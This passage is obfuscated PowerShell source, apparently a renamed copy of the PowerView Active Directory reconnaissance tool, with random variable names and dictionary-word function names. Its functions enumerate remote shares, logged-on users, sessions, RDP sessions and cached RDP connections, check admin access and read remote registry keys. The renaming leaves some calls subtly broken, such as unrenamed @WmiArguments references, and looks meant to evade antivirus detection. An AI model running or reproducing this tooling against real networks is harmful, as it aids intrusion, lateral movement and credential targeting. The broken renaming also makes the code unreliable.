                        $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'AccountName' $Name
                        $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($bQMIjDgp9sDD9pr.InvokeGet('ObjectSID'),0)).Value)
                        $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'IsGroup' $N9OnjqLhExywIoM
                        $9mLdlSJRwrOuSuV | Add-Member Noteproperty 'IsDomain' $SpXFzWaRNXbUPWc

















































                        $9mLdlSJRwrOuSuV
                    }
                }
                catch {
                    Write-Verbose "[kicking] Error for $wlkrajnezbzvml9 : $_"
                }
            }
        }
    }
    
    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function unfriends {


    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            $eWWQvrgoyViISYz = 1
            $aNiBQenLexxQfRW = [IntPtr]::Zero
            $Uc9GjSDPNk9d9jP = 0
            $PSFMflZkgNAkW9Q = 0
            $9kUlAuTTPvri9LF = 0


            $tP9ZFuQ9oFJi9ZB = $fWPrzxt9Txhddkn::NetShareEnum($wlkrajnezbzvml9, $eWWQvrgoyViISYz, [ref]$aNiBQenLexxQfRW, -1, [ref]$Uc9GjSDPNk9d9jP, [ref]$PSFMflZkgNAkW9Q, [ref]$9kUlAuTTPvri9LF)


            $IQJFgwWwdtqcTml = $aNiBQenLexxQfRW.ToInt64()


            if (($tP9ZFuQ9oFJi9ZB -eq 0) -and ($IQJFgwWwdtqcTml -gt 0)) {


                $MpkVCERvuMvVtNa = $DiOtNvBLwuT9TTW::GetSize()


                for ($i = 0; ($i -lt $Uc9GjSDPNk9d9jP); $i++) {

                    $hsSd9EOnfwKvO9d = New-Object System.Intptr -ArgumentList $IQJFgwWwdtqcTml
                    $Info = $hsSd9EOnfwKvO9d -as $DiOtNvBLwuT9TTW


                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $IQJFgwWwdtqcTml = $hsSd9EOnfwKvO9d.ToInt64()
                    $IQJFgwWwdtqcTml += $MpkVCERvuMvVtNa
                    $Share
                }


                $Null = $fWPrzxt9Txhddkn::NetApiBufferFree($aNiBQenLexxQfRW)
            }
            else {
                Write-Verbose "[unfriends] Error: $(([ComponentModel.Win32Exception] $tP9ZFuQ9oFJi9ZB).Message)"
            }
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function modifier {


    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            $eWWQvrgoyViISYz = 1
            $aNiBQenLexxQfRW = [IntPtr]::Zero
            $Uc9GjSDPNk9d9jP = 0
            $PSFMflZkgNAkW9Q = 0
            $9kUlAuTTPvri9LF = 0


            $tP9ZFuQ9oFJi9ZB = $fWPrzxt9Txhddkn::NetWkstaUserEnum($wlkrajnezbzvml9, $eWWQvrgoyViISYz, [ref]$aNiBQenLexxQfRW, -1, [ref]$Uc9GjSDPNk9d9jP, [ref]$PSFMflZkgNAkW9Q, [ref]$9kUlAuTTPvri9LF)


            $IQJFgwWwdtqcTml = $aNiBQenLexxQfRW.ToInt64()


            if (($tP9ZFuQ9oFJi9ZB -eq 0) -and ($IQJFgwWwdtqcTml -gt 0)) {


                $MpkVCERvuMvVtNa = $sjlOqrVrfnMOkKP::GetSize()


                for ($i = 0; ($i -lt $Uc9GjSDPNk9d9jP); $i++) {

                    $hsSd9EOnfwKvO9d = New-Object System.Intptr -ArgumentList $IQJFgwWwdtqcTml
                    $Info = $hsSd9EOnfwKvO9d -as $sjlOqrVrfnMOkKP


                    $9gKxZA9kB9dxGdU = $Info | Select-Object *
                    $9gKxZA9kB9dxGdU | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                    $9gKxZA9kB9dxGdU.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $IQJFgwWwdtqcTml = $hsSd9EOnfwKvO9d.ToInt64()
                    $IQJFgwWwdtqcTml += $MpkVCERvuMvVtNa
                    $9gKxZA9kB9dxGdU
                }


                $Null = $fWPrzxt9Txhddkn::NetApiBufferFree($aNiBQenLexxQfRW)
            }
            else {
                Write-Verbose "[modifier] Error: $(([ComponentModel.Win32Exception] $tP9ZFuQ9oFJi9ZB).Message)"
            }
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function depositories {


    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            $eWWQvrgoyViISYz = 10
            $aNiBQenLexxQfRW = [IntPtr]::Zero
            $Uc9GjSDPNk9d9jP = 0
            $PSFMflZkgNAkW9Q = 0
            $9kUlAuTTPvri9LF = 0


            $tP9ZFuQ9oFJi9ZB = $fWPrzxt9Txhddkn::NetSessionEnum($wlkrajnezbzvml9, '', $p9HnEIzwegumibI, $eWWQvrgoyViISYz, [ref]$aNiBQenLexxQfRW, -1, [ref]$Uc9GjSDPNk9d9jP, [ref]$PSFMflZkgNAkW9Q, [ref]$9kUlAuTTPvri9LF)


            $IQJFgwWwdtqcTml = $aNiBQenLexxQfRW.ToInt64()


            if (($tP9ZFuQ9oFJi9ZB -eq 0) -and ($IQJFgwWwdtqcTml -gt 0)) {


                $MpkVCERvuMvVtNa = $EglVVHficmGx9gw::GetSize()


                for ($i = 0; ($i -lt $Uc9GjSDPNk9d9jP); $i++) {

                    $hsSd9EOnfwKvO9d = New-Object System.Intptr -ArgumentList $IQJFgwWwdtqcTml
                    $Info = $hsSd9EOnfwKvO9d -as $EglVVHficmGx9gw


                    $LUGxVXpz9I9CnT9 = $Info | Select-Object *
                    $LUGxVXpz9I9CnT9 | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                    $LUGxVXpz9I9CnT9.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $IQJFgwWwdtqcTml = $hsSd9EOnfwKvO9d.ToInt64()
                    $IQJFgwWwdtqcTml += $MpkVCERvuMvVtNa
                    $LUGxVXpz9I9CnT9
                }


                $Null = $fWPrzxt9Txhddkn::NetApiBufferFree($aNiBQenLexxQfRW)
            }
            else {
                Write-Verbose "[depositories] Error: $(([ComponentModel.Win32Exception] $tP9ZFuQ9oFJi9ZB).Message)"
            }
        }
    }


    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function Hawaiians {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {
            try {

                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$cNTDaoDBIWkDu9I")


                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $p9HnEIzwegumibI = congesting -ObjectSID $_ -nnLLVWbvFttZtjp 'DomainSimple'

                    if ($p9HnEIzwegumibI) {
                        $p9HnEIzwegumibI, $tXyHSLSY9cxTtcf = $p9HnEIzwegumibI.Split('@')
                    }
                    else {
                        $p9HnEIzwegumibI = $_
                        $tXyHSLSY9cxTtcf = $Null
                    }

                    $sJMewDwIBHLfmp9 = New-Object PSObject
                    $sJMewDwIBHLfmp9 | Add-Member Noteproperty 'ComputerName' "$cNTDaoDBIWkDu9I"
                    $sJMewDwIBHLfmp9 | Add-Member Noteproperty 'UserDomain' $tXyHSLSY9cxTtcf
                    $sJMewDwIBHLfmp9 | Add-Member Noteproperty 'UserName' $p9HnEIzwegumibI
                    $sJMewDwIBHLfmp9 | Add-Member Noteproperty 'UserSID' $_
                    $sJMewDwIBHLfmp9.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $sJMewDwIBHLfmp9
                }
            }
            catch {
                Write-Verbose "[Hawaiians] Error opening remote registry on '$cNTDaoDBIWkDu9I' : $_"
            }
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function infinities {


    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {


            $ve9SEGXZJWwvfct = $9KAJTjhDjLKRGcx::WTSOpenServerEx($wlkrajnezbzvml9)


            if ($ve9SEGXZJWwvfct -ne 0) {


                $pfoj9JHbSWzWFkn = [IntPtr]::Zero
                $rslAjHPtbayrjtk = 0


                $tP9ZFuQ9oFJi9ZB = $9KAJTjhDjLKRGcx::WTSEnumerateSessionsEx($ve9SEGXZJWwvfct, [ref]1, 0, [ref]$pfoj9JHbSWzWFkn, [ref]$rslAjHPtbayrjtk);$aMxKZmpCKWbTpbk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()


                $IQJFgwWwdtqcTml = $pfoj9JHbSWzWFkn.ToInt64()

                if (($tP9ZFuQ9oFJi9ZB -ne 0) -and ($IQJFgwWwdtqcTml -gt 0)) {


                    $MpkVCERvuMvVtNa = $kXSSdzfXNwjWASv::GetSize()


                    for ($i = 0; ($i -lt $rslAjHPtbayrjtk); $i++) {


                        $hsSd9EOnfwKvO9d = New-Object System.Intptr -ArgumentList $IQJFgwWwdtqcTml
                        $Info = $hsSd9EOnfwKvO9d -as $kXSSdzfXNwjWASv

                        $99HUMxUXNfiSgUh = New-Object PSObject

                        if ($Info.pHostName) {
                            $99HUMxUXNfiSgUh | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {

                            $99HUMxUXNfiSgUh | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                        }

                        $99HUMxUXNfiSgUh | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {

                            $99HUMxUXNfiSgUh | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $99HUMxUXNfiSgUh | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $99HUMxUXNfiSgUh | Add-Member Noteproperty 'ID' $Info.SessionID
                        $99HUMxUXNfiSgUh | Add-Member Noteproperty 'State' $Info.State

                        $LNKzefl9gQpkvVA = [IntPtr]::Zero
                        $uaKa9IvGcR9e9Yf = 0



                        $ZapCWQ9vaixQrHr = $9KAJTjhDjLKRGcx::WTSQuerySessionInformation($ve9SEGXZJWwvfct, $Info.SessionID, 14, [ref]$LNKzefl9gQpkvVA, [ref]$uaKa9IvGcR9e9Yf);$FOLirEdb9hLyBJ9 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($ZapCWQ9vaixQrHr -eq 0) {
                            Write-Verbose "[infinities] Error: $(([ComponentModel.Win32Exception] $FOLirEdb9hLyBJ9).Message)"
                        }
                        else {
                            $oIXuRRYSfXYnN9z = $LNKzefl9gQpkvVA.ToInt64()
                            $UbtdryZLIwQUvHz = New-Object System.Intptr -ArgumentList $oIXuRRYSfXYnN9z
                            $Info2 = $UbtdryZLIwQUvHz -as $HTYS9ooELkxPUXE

                            $9rMWmEAIrYKjRLX = $Info2.Address
                            if ($9rMWmEAIrYKjRLX[2] -ne 0) {
                                $9rMWmEAIrYKjRLX = [String]$9rMWmEAIrYKjRLX[2]+'.'+[String]$9rMWmEAIrYKjRLX[3]+'.'+[String]$9rMWmEAIrYKjRLX[4]+'.'+[String]$9rMWmEAIrYKjRLX[5]
                            }
                            else {
                                $9rMWmEAIrYKjRLX = $Null
                            }

                            $99HUMxUXNfiSgUh | Add-Member Noteproperty 'SourceIP' $9rMWmEAIrYKjRLX
                            $99HUMxUXNfiSgUh.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $99HUMxUXNfiSgUh


                            $Null = $9KAJTjhDjLKRGcx::WTSFreeMemory($LNKzefl9gQpkvVA)

                            $IQJFgwWwdtqcTml += $MpkVCERvuMvVtNa
                        }
                    }

                    $Null = $9KAJTjhDjLKRGcx::WTSFreeMemoryEx(2, $pfoj9JHbSWzWFkn, $rslAjHPtbayrjtk)
                }
                else {
                    Write-Verbose "[infinities] Error: $(([ComponentModel.Win32Exception] $aMxKZmpCKWbTpbk).Message)"
                }

                $Null = $9KAJTjhDjLKRGcx::WTSCloseServer($ve9SEGXZJWwvfct)
            }
            else {
                Write-Verbose "[infinities] Error opening the Remote Desktop Session Host (RD Session Host) server for: $cNTDaoDBIWkDu9I"
            }
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function Boulez {


    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {


            $ve9SEGXZJWwvfct = $JRe9dkTvhkNHAuS::OpenSCManagerW("\\$wlkrajnezbzvml9", 'ServicesActive', 0xF003F);$aMxKZmpCKWbTpbk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $wePi9OewPQcjupu = New-Object PSObject
            $wePi9OewPQcjupu | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9


            if ($ve9SEGXZJWwvfct -ne 0) {
                $Null = $JRe9dkTvhkNHAuS::CloseServiceHandle($ve9SEGXZJWwvfct)
                $wePi9OewPQcjupu | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Boulez] Error: $(([ComponentModel.Win32Exception] $aMxKZmpCKWbTpbk).Message)"
                $wePi9OewPQcjupu | Add-Member Noteproperty 'IsAdmin' $False
            }
            $wePi9OewPQcjupu.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $wePi9OewPQcjupu
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function fillers {


    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $wFitNRlTdxnBQoR = descendents -szvFVWkPJummdcf $szvFVWkPJummdcf
        }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            if ($wlkrajnezbzvml9 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $chlzobgN9SNL9hL = $wlkrajnezbzvml9
                $wlkrajnezbzvml9 = [System.Net.Dns]::GetHostByAddress($wlkrajnezbzvml9) | Select-Object -ExpandProperty HostName
            }
            else {
                $chlzobgN9SNL9hL = @(emaciates -cNTDaoDBIWkDu9I $wlkrajnezbzvml9)[0].IPAddress
            }

            $aNiBQenLexxQfRW = [IntPtr]::Zero

            $tP9ZFuQ9oFJi9ZB = $fWPrzxt9Txhddkn::DsGetSiteName($wlkrajnezbzvml9, [ref]$aNiBQenLexxQfRW)

            $TI9qcSwGfGkjbX9 = New-Object PSObject
            $TI9qcSwGfGkjbX9 | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
            $TI9qcSwGfGkjbX9 | Add-Member Noteproperty 'IPAddress' $chlzobgN9SNL9hL

            if ($tP9ZFuQ9oFJi9ZB -eq 0) {
                $SmSMWEXMkNVoOuD = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($aNiBQenLexxQfRW)
                $TI9qcSwGfGkjbX9 | Add-Member Noteproperty 'SiteName' $SmSMWEXMkNVoOuD
            }
            else {
                Write-Verbose "[fillers] Error: $(([ComponentModel.Win32Exception] $tP9ZFuQ9oFJi9ZB).Message)"
                $TI9qcSwGfGkjbX9 | Add-Member Noteproperty 'SiteName' ''
            }
            $TI9qcSwGfGkjbX9.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')


            $Null = $fWPrzxt9Txhddkn::NetApiBufferFree($aNiBQenLexxQfRW)

            $TI9qcSwGfGkjbX9
        }
    }

    END {
        if ($wFitNRlTdxnBQoR) {
            volubility -waC9KrLWsegTDKV $wFitNRlTdxnBQoR
        }
    }
}


function Caucasians {


    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {
            try {
                $jOTeeQlYyHOUMuw = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $wlkrajnezbzvml9
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $jOTeeQlYyHOUMuw['Credential'] = $szvFVWkPJummdcf }

                $n9MTNa9pxgqVsAj = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'


                $HKCU = 2147483649
                $geB9VVkAwiCKNKh = $n9MTNa9pxgqVsAj.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $iTUewsWv9NDcGm9 = $n9MTNa9pxgqVsAj.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($iTUewsWv9NDcGm9 -and ($iTUewsWv9NDcGm9 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($iTUewsWv9NDcGm9)
                    }
                    catch {
                        Write-Warning "[Caucasians] Error connecting to AutoConfigURL : $iTUewsWv9NDcGm9"
                    }
                }

                if ($geB9VVkAwiCKNKh -or $iTUewsWv9NDcGm9) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                    $Out | Add-Member Noteproperty 'ProxyServer' $geB9VVkAwiCKNKh
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $iTUewsWv9NDcGm9
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[Caucasians] No proxy settings found for $cNTDaoDBIWkDu9I"
                }
            }
            catch {
                Write-Warning "[Caucasians] Error enumerating proxy settings for $cNTDaoDBIWkDu9I : $_"
            }
        }
    }
}


function adjudging {


    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            $HKLM = 2147483650

            $jOTeeQlYyHOUMuw = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $wlkrajnezbzvml9
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $jOTeeQlYyHOUMuw['Credential'] = $szvFVWkPJummdcf }


            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $lkRmWGejLPUudCP = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $Wdo9MhayLFkVjQK = New-Object PSObject
                $Wdo9MhayLFkVjQK | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                $Wdo9MhayLFkVjQK | Add-Member Noteproperty 'LastLoggedOn' $lkRmWGejLPUudCP
                $Wdo9MhayLFkVjQK.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $Wdo9MhayLFkVjQK
            }
            catch {
                Write-Warning "[adjudging] Error opening remote registry on $wlkrajnezbzvml9. Remote registry likely not enabled."
            }
        }
    }
}


function lumberjacks {


    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            $HKU = 2147483651

            $jOTeeQlYyHOUMuw = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $wlkrajnezbzvml9
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $jOTeeQlYyHOUMuw['Credential'] = $szvFVWkPJummdcf }

            try {
                $Reg = Get-WmiObject @WmiArguments


                $OJ9JyXGuNqZpN9I = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($HBIzLvnP9chfdgb in $OJ9JyXGuNqZpN9I) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $p9HnEIzwegumibI = congesting -BwJjYSLSjCOa9Mo $HBIzLvnP9chfdgb -szvFVWkPJummdcf $szvFVWkPJummdcf
                        }
                        else {
                            $p9HnEIzwegumibI = congesting -BwJjYSLSjCOa9Mo $HBIzLvnP9chfdgb
                        }


                        $VsfeLQ9jfGj9vxI = $Reg.EnumValues($HKU,"$HBIzLvnP9chfdgb\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($hgzf9lxoAPBgWUc in $VsfeLQ9jfGj9vxI) {

                            if ($hgzf9lxoAPBgWUc -match 'MRU.*') {
                                $oDEg9ZRWAKfBuIs = $Reg.GetStringValue($HKU, "$HBIzLvnP9chfdgb\Software\Microsoft\Terminal Server Client\Default", $hgzf9lxoAPBgWUc).sValue

                                $kJQiwTdKNTELudT = New-Object PSObject
                                $kJQiwTdKNTELudT | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                                $kJQiwTdKNTELudT | Add-Member Noteproperty 'UserName' $p9HnEIzwegumibI
                                $kJQiwTdKNTELudT | Add-Member Noteproperty 'UserSID' $HBIzLvnP9chfdgb
                                $kJQiwTdKNTELudT | Add-Member Noteproperty 'TargetServer' $oDEg9ZRWAKfBuIs
                                $kJQiwTdKNTELudT | Add-Member Noteproperty 'UsernameHint' $Null
                                $kJQiwTdKNTELudT.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $kJQiwTdKNTELudT
                            }
                        }


                        $wTiduwGaWdBRyj9 = $Reg.EnumKey($HKU,"$HBIzLvnP9chfdgb\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($vzBgfX9wPWmbsYZ in $wTiduwGaWdBRyj9) {

                            $crNPGntAjTVcfIn = $Reg.GetStringValue($HKU, "$HBIzLvnP9chfdgb\Software\Microsoft\Terminal Server Client\Servers\$vzBgfX9wPWmbsYZ", 'UsernameHint').sValue

                            $kJQiwTdKNTELudT = New-Object PSObject
                            $kJQiwTdKNTELudT | Add-Member Noteproperty 'ComputerName' $wlkrajnezbzvml9
                            $kJQiwTdKNTELudT | Add-Member Noteproperty 'UserName' $p9HnEIzwegumibI
                            $kJQiwTdKNTELudT | Add-Member Noteproperty 'UserSID' $HBIzLvnP9chfdgb
                            $kJQiwTdKNTELudT | Add-Member Noteproperty 'TargetServer' $vzBgfX9wPWmbsYZ
                            $kJQiwTdKNTELudT | Add-Member Noteproperty 'UsernameHint' $crNPGntAjTVcfIn
                            $kJQiwTdKNTELudT.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $kJQiwTdKNTELudT
                        }
                    }
                    catch {
                        Write-Verbose "[lumberjacks] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[lumberjacks] Error accessing $wlkrajnezbzvml9, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function epicenter {


    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            $HKU = 2147483651

            $jOTeeQlYyHOUMuw = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $wlkrajnezbzvml9
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $jOTeeQlYyHOUMuw['Credential'] = $szvFVWkPJummdcf }

            try {
                $Reg = Get-WmiObject @WmiArguments


                $OJ9JyXGuNqZpN9I = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

